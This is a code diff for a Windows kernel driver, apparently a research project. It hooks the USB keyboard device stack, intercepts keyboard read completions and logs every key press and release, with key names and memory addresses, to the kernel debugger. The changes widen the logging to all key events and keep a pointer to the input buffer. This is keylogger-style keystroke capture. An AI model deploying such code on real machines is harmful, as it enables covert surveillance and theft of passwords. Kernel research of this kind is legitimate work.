@@ -7,6 +7,7 @@
 #include <PageTableManipulation.h>
 #include <KeyboardHooker.h>
 
+PULONG keyboardFlag = NULL;
 PDEVICE_OBJECT usbKeyboardDeviceObject;
 VOID pauseForABit(CSHORT secondsDelay) {
 
@@ -68,10 +69,15 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
 
 		if (MmIsAddressValid(keys)) {
+
+			if (keyboardFlag == NULL) {
+				keyboardFlag = keys;
+			}
+
+
 			if (queryPvoid) {
 				if (MmIsAddressValid(queryPvoid)) {
 					PULONG qplong = (PULONG)queryPvoid;
-					if (keys->Flags == KEY_MAKE) {
 						PUSHORT pflag = &(keys->Flags);
 						PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
 						PUSHORT make = &(keys->MakeCode);
@@ -82,10 +88,8 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 							keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
 							*make, make, makePA,
 							*qplong, qplong, &qplong, qplong[0], qplong[1], qplong[2], qplong[3], qplong[4], qplong[5], qplong[6], qplong[7]));
-					}
 				}
 				else {
-					if (keys->Flags == KEY_MAKE) {
 						PUSHORT pflag = &(keys->Flags);
 						PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
 						PUSHORT make = &(keys->MakeCode);
@@ -95,11 +99,10 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 							KeyMap[keys->MakeCode],
 							keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
 							*make, make, makePA, queryPvoid));
-					}
 				}
 			}
 			else {
-				if (keys->Flags == KEY_MAKE) {
+				
 					PUSHORT pflag = &(keys->Flags);
 					PHYSICAL_ADDRESS flagPA = MmGetPhysicalAddress(pflag);
 					PUSHORT make = &(keys->MakeCode);
@@ -110,7 +113,6 @@ NTSTATUS OnReadCompletion(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PVOI
 						keys->Flags == KEY_BREAK ? "Key Up  " : keys->Flags == KEY_MAKE ? "Key Down" : "Unknown ",
 						keys->UnitId, keys->Reserved, keys->ExtraInformation
 						, *make, make, makePA, *pflag, pflag, flagPA));
-				}
 			}
 		}
 	}//end if  
@@ -166,22 +168,22 @@ NTSTATUS PrepHook(IN PDRIVER_OBJECT pDriverObject) {
 	KdPrint(("Created keyboard device successfully...\n"));
 	KdPrint(("pKeyboardDeviceObject is: [0x%llx]\n", pKeyboardDeviceObject));
 
-	pauseForABit(10);
+//	pauseForABit(10);
 
 	// Set the Flags
 	//pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DRVO_LEGACY_RESOURCES);
 	//KdPrint(("DO_BUFFERED_IO | DRVO_LEGACY_RESOURCES Flags set\n"));
 	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
 	KdPrint(("DO_BUFFERED_IO | DO_POWER_PAGABLE Flags set\n"));
-	pauseForABit(10);
+//	pauseForABit(10);
 	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
-	KdPrint(("Flags set succesfully...\n"));
-	pauseForABit(10);
+//	KdPrint(("Flags set succesfully...\n"));
+//	pauseForABit(10);
 
 	// Zero out the device extension  
 	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(KLOG_DEVICE_EXTENSION));
-	KdPrint(("Device Extension Initialized...\n"));
-	pauseForABit(10);
+//	KdPrint(("Device Extension Initialized...\n"));
+//	pauseForABit(10);
 	return status;
 }
 _Use_decl_annotations_
@@ -191,8 +193,8 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject, IN PDEVICE_OBJECT usbBase
 	usbKeyboardDeviceObject = usbBaseKeyboardDeviceObject->AttachedDevice;
 
 	if (usbKeyboardDeviceObject) {
-		KdPrint(("got usbkeyboarddeviceobject\n"));
-		pauseForABit(10);
+//		KdPrint(("got usbkeyboarddeviceobject\n"));
+//		pauseForABit(10);
 		PHID_KBD usbDeviceExtension = usbKeyboardDeviceObject->DeviceExtension;
 
 		PDEVOBJ_EXTENSION usbObjectExtension = usbKeyboardDeviceObject->DeviceObjectExtension;
@@ -217,10 +219,10 @@ NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject, IN PDEVICE_OBJECT usbBase
 	}
 	else {
 		KdPrint(("usbKeyboardDeviceObject is NULL\n"));
-		pauseForABit(10);
+//		pauseForABit(10);
 	}
 	KdPrint(("about to attach to device stack safe\n"));
-	pauseForABit(10);
+//	pauseForABit(10);
 
 	PKLOG_DEVICE_EXTENSION pKeyboardDeviceExtension = (PKLOG_DEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
 	status = IoAttachDeviceToDeviceStackSafe(pKeyboardDeviceObject, usbKeyboardDeviceObject, &pKeyboardDeviceExtension->pKeyboardDevice);
@@ -251,7 +253,7 @@ _Use_decl_annotations_
 NTSTATUS SetMajorFunction(_In_ PDRIVER_OBJECT  DriverObject)
 {
 	KdPrint(("SetMajorFunction IRQ Level [%u]", KeGetCurrentIrql()));
-	pauseForABit(10);
+//	pauseForABit(10);
 	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
 
 	return STATUS_SUCCESS;
